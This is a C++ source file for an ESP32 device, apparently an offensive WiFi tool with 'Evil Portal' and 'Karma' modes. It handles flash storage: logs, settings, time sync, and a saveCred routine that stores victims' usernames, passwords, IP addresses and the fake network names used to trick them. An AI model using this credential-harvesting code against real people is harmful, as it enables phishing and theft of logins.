/**
 * cyber_storage.cpp — Persistent Flash Storage (LittleFS)
 * ---------------------------------------------------------
 * Manages all persistent data on the ESP32's 4MB flash using LittleFS,
 * a lightweight filesystem designed for microcontrollers.
 *
 * Stored data:
 *   /creds/creds.json  — Captured credentials (Evil Portal, Karma)
 *   /logs/log.json     — Event log (last 100 entries)
 *   /settings.json     — Device settings (PIN, preferences)
 *
 * All operations are synchronous (LittleFS does not support async I/O).
 * JSON serialisation via ArduinoJson. Documents kept small to minimise
 * heap allocation during read/write cycles.
 *
 * Credentials survive reboots and power cycles.
 * Settings include the web UI PIN (hashed storage recommended in future).
 *
 * Author: ESP32 Cyber Device Project
 */
#include "cyber_storage.h"
#include <WiFi.h>

CyberStorage cyberStorage;

bool CyberStorage::begin() {
  // LittleFS is a lightweight filesystem for the ESP32's built-in flash memory.
  // The 'true' parameter means "format the filesystem if mounting fails"
  // This handles the case where the device is brand new and has no filesystem yet.
  if(!LittleFS.begin(true)) {
    Serial.println("LittleFS: mount failed, formatting...");
    LittleFS.format(); // wipe and reformat the filesystem partition
    if(!LittleFS.begin(true)) {
      Serial.println("LittleFS: failed after format");
      return false; // something seriously wrong with the flash chip
    }
  }

  _mounted = true; // set flag so other functions know the filesystem is ready

  // Create the directories we need if they don't exist yet
  _ensureDir("/creds"); // folder for captured credentials
  _ensureDir("/logs");  // folder for event logs

  Serial.printf("LittleFS: mounted. Free: %d KB\n",
    (LittleFS.totalBytes()-LittleFS.usedBytes())/1024); // show available flash space
  return true;
}

void CyberStorage::_ensureDir(const String& path) {
  if(!LittleFS.exists(path)) LittleFS.mkdir(path);
}

// ── Credentials ────────────────────────────────────────────────────────────
void CyberStorage::saveCred(const String& type, const String& ssid,
                             const String& user, const String& pass,
                             const String& ip) {
  if(!_mounted) return; // filesystem not ready - can't save

  String path = "/creds/creds.json"; // all creds go in one JSON file

  // Load the existing credentials file (if it exists) so we can append to it
  // We use DynamicJsonDocument because the size of the credentials file varies
  DynamicJsonDocument doc(8192); // 8KB should hold plenty of credentials
  if(LittleFS.exists(path)) {
    File f = LittleFS.open(path, "r");
    deserializeJson(doc, f); // parse the existing JSON into memory
    f.close();
  }

  // Get the "creds" array from the document, or create it if it doesn't exist
  JsonArray arr = doc.containsKey("creds") ?
    doc["creds"].as<JsonArray>() :
    doc.createNestedArray("creds");

  // Create a new entry object and fill in the fields
  JsonObject entry = arr.createNestedObject();
  entry["type"] = type; // where this came from: "portal", "karma", etc.
  entry["ssid"] = ssid; // the fake network name that tricked the victim
  entry["user"] = user; // username/email they entered
  entry["pass"] = pass; // password they entered
  entry["ip"]   = ip;   // victim's IP address
  entry["time"] = getTimestamp(); // when this was captured

  // Write the updated JSON back to the file (overwrites the old file)
  File f = LittleFS.open(path, "w");
  serializeJson(doc, f);
  f.close();

  Serial.printf("Storage: cred saved (%s / %s)\n", user.c_str(), pass.c_str());
}

String CyberStorage::getCredsJson() {
  if(!_mounted) return "[]";
  String path = "/creds/creds.json";
  if(!LittleFS.exists(path)) return "[]";
  File f = LittleFS.open(path, "r");
  DynamicJsonDocument doc(8192);
  deserializeJson(doc, f);
  f.close();
  String out;
  serializeJson(doc["creds"]|doc.to<JsonArray>(), out);
  return out;
}

void CyberStorage::clearCreds() {
  if(!_mounted) return;
  LittleFS.remove("/creds/creds.json");
  Serial.println("Storage: creds cleared");
}

int CyberStorage::getCredCount() {
  if(!_mounted) return 0;
  String path = "/creds/creds.json";
  if(!LittleFS.exists(path)) return 0;
  File f = LittleFS.open(path, "r");
  DynamicJsonDocument doc(8192);
  deserializeJson(doc, f);
  f.close();
  return doc["creds"].as<JsonArray>().size();
}

// ── Logs ───────────────────────────────────────────────────────────────────
void CyberStorage::addLog(const String& type, const String& msg) {
  if(!_mounted) return;
  String path = "/logs/log.json";
  DynamicJsonDocument doc(8192); // 8KB for ~100 log entries
  if(LittleFS.exists(path)) {
    File f = LittleFS.open(path, "r");
    deserializeJson(doc, f);
    f.close();
  }
  JsonArray arr = doc.containsKey("logs") ?
    doc["logs"].as<JsonArray>() : doc.createNestedArray("logs");

  // Keep last 100 entries (reduced from 200 to save heap)
  while(arr.size() >= 100) arr.remove(0);

  JsonObject e = arr.createNestedObject();
  e["ts"]   = getTimestamp();
  e["type"] = type;
  e["msg"]  = msg;

  File f = LittleFS.open(path, "w");
  serializeJson(doc, f);
  f.close();
}

String CyberStorage::getLogsJson() {
  if(!_mounted) return "[]";
  String path = "/logs/log.json";
  if(!LittleFS.exists(path)) return "[]";
  File f = LittleFS.open(path, "r");
  DynamicJsonDocument doc(8192);
  deserializeJson(doc, f);
  f.close();
  String out;
  serializeJson(doc["logs"]|doc.to<JsonArray>(), out);
  return out;
}

void CyberStorage::clearLogs() {
  if(!_mounted) return;
  LittleFS.remove("/logs/log.json");
}

// ── Settings ───────────────────────────────────────────────────────────────
void CyberStorage::saveSetting(const String& key, const String& val) {
  if(!_mounted) return;
  String path = "/settings.json";
  DynamicJsonDocument doc(1024);
  if(LittleFS.exists(path)) {
    File f = LittleFS.open(path, "r");
    deserializeJson(doc, f);
    f.close();
  }
  doc[key] = val;
  File f = LittleFS.open(path, "w");
  serializeJson(doc, f);
  f.close();
}

String CyberStorage::getSetting(const String& key, const String& def) {
  if(!_mounted) return def;
  String path = "/settings.json";
  if(!LittleFS.exists(path)) return def;
  File f = LittleFS.open(path, "r");
  DynamicJsonDocument doc(1024);
  deserializeJson(doc, f);
  f.close();
  return doc.containsKey(key) ? doc[key].as<String>() : def;
}

// ── NTP ────────────────────────────────────────────────────────────────────
void CyberStorage::syncTime(const String& tz) {
  if(WiFi.status() != WL_CONNECTED) return;
  configTzTime(tz.c_str(), "pool.ntp.org", "time.google.com");
  Serial.println("NTP: syncing...");
  // Wait up to 5s for sync
  struct tm t;
  uint32_t start = millis();
  while(!getLocalTime(&t, 100) && millis()-start < 5000) delay(100);
  if(getLocalTime(&t, 100))
    Serial.printf("NTP: synced — %02d/%02d/%04d %02d:%02d:%02d\n",
      t.tm_mday, t.tm_mon+1, t.tm_year+1900,
      t.tm_hour, t.tm_min, t.tm_sec);
  else
    Serial.println("NTP: sync failed");
}

String CyberStorage::getTimestamp() {
  struct tm t;
  if(!getLocalTime(&t, 100)) {
    return String(millis()/1000) + "s";
  }
  char buf[32];
  strftime(buf, sizeof(buf), "%d/%m/%Y %H:%M:%S", &t);
  return String(buf);
}

bool CyberStorage::timeReady() {
  struct tm t;
  return getLocalTime(&t, 100);
}
